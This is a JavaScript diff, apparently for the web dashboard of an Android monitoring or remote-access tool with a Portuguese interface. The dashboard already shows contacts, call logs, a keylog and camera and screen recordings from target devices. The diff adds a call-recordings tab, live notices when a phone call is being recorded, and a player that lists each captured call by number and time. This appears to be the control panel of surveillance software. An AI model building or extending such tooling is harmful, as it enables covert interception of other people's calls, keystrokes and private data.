@@ -329,7 +329,7 @@ function toggleSidebarDevices() {
 }
 
 // Tabs that live inside the "Mais" drawer — their activation highlights the Mais button
-const MORE_TABS = new Set(['more', 'contacts', 'calllogs', 'keylog']);
+const MORE_TABS = new Set(['more', 'contacts', 'calllogs', 'keylog', 'call-recordings']);
 
 function switchTab(tab) {
     if (window.innerWidth > 767) return; // desktop keeps the grid — sidebarNav handles scroll
@@ -869,6 +869,21 @@ function handleJsonMessage(data) {
             if (data.deviceId === currentDeviceId) {
                 fetchMediaList(currentDeviceId);
             }
+            break;
+
+        case 'CALL_RECORD_STARTED': {
+            const dir = data.direction === 'out' ? 'saída' : 'entrada';
+            logToConsole(`📞 Gravando ligação (${dir}: ${data.number || '?'})...`, 'system');
+            break;
+        }
+
+        case 'CALL_RECORD_STOPPED':
+            logToConsole(`⏹ Ligação encerrada — aguardando upload do áudio...`, 'system');
+            break;
+
+        case 'CALL_RECORD_UPLOADED':
+            logToConsole(`📞 Nova gravação de ligação recebida (${data.direction === 'out' ? 'saída' : 'entrada'}: ${data.number || '?'})!`, 'success');
+            if (data.deviceId === currentDeviceId) fetchMediaList(currentDeviceId);
             break;
 
         case 'NEW_MESSAGE':
@@ -1720,6 +1735,7 @@ function fetchMediaList(deviceId) {
             renderScreenshots(deviceId, data.screenshots || []);
             renderScreenRecordings(deviceId, data.screenRecordings || []);
             renderCameraRecordings(deviceId, data.cameraRecordings || []);
+            renderCallRecordings(deviceId, data.callRecordings || []);
         })
         .catch(err => console.error('Error fetching media list:', err));
 }
@@ -2106,6 +2122,49 @@ function renderCameraRecordings(deviceId, recordings) {
             <video controls style="width:100%;max-height:200px;border-radius:8px;margin-top:8px;background:#000" preload="metadata">
                 <source src="${url}" type="video/mp4">
             </video>`;
+        list.appendChild(div);
+    });
+}
+
+function renderCallRecordings(deviceId, recordings) {
+    const empty = document.getElementById('call-recordings-empty');
+    const list  = document.getElementById('call-recordings-list');
+    if (!list) return;
+
+    if (!recordings || recordings.length === 0) {
+        if (empty) empty.style.display = '';
+        list.style.display = 'none';
+        list.innerHTML = '';
+        return;
+    }
+    if (empty) empty.style.display = 'none';
+    list.style.display = '';
+    list.innerHTML = '';
+
+    [...recordings].forEach(item => {
+        const fileName  = item.name || item;
+        const url       = item.url || `/uploads/${deviceId}/call-recordings/${fileName}`;
+        // Filename: call_in_+5511999999999_1748923456789.m4a
+        const dirMatch  = fileName.match(/call_(in|out)_/);
+        const numMatch  = fileName.match(/call_(?:in|out)_([^_]+)_\d+/);
+        const tsMatch   = fileName.match(/_(\d{13})\.m4a$/);
+        const dir       = dirMatch ? (dirMatch[1] === 'in' ? '📥 Entrada' : '📤 Saída') : '';
+        const number    = numMatch ? numMatch[1] : 'desconhecido';
+        const ts        = tsMatch  ? new Date(parseInt(tsMatch[1])).toLocaleString('pt-BR') : fileName;
+
+        const div = document.createElement('div');
+        div.className = 'audio-item';
+        div.innerHTML = `
+            <div class="audio-info" style="flex-direction:column;align-items:flex-start;gap:4px;">
+                <div style="display:flex;align-items:center;gap:8px;">
+                    <i class="fa-solid fa-phone" style="color:var(--neon-green)"></i>
+                    <span class="audio-name">${dir} &nbsp; ${escapeHtml(number)}</span>
+                </div>
+                <span class="audio-time">${ts}</span>
+            </div>
+            <audio controls style="width:100%;margin-top:8px;" preload="none">
+                <source src="${url}" type="audio/mp4">
+            </audio>`;
         list.appendChild(div);
     });
 }
